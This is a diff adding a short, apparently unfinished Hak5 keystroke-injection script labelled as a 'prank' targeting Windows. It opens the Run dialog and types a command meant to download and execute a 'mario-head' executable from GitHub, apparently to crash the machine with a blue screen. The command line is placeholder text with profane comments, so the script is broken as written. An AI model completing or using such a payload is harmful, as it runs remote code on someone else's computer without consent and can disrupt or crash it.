@@ -1,0 +1,13 @@
+REM Title: Mario-Head BSOD
+REM Author: FalsePhilosopher
+REM Target:  Windows 7 32-64 bit and up
+REM Props: Hak5, bemxio for creating mario-head https://github.com/bemxio/mario-head and memes
+REM Version: 1.0
+REM Category: Prank
+REM
+REM startup delay
+DELAY 300
+GUI r
+DELAY 500
+STRING some PS bullshit https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe some PS bullshit
+The fuck is this PS bullshit, just let me wget && ./ it instead of whatever the fuck that shit is.
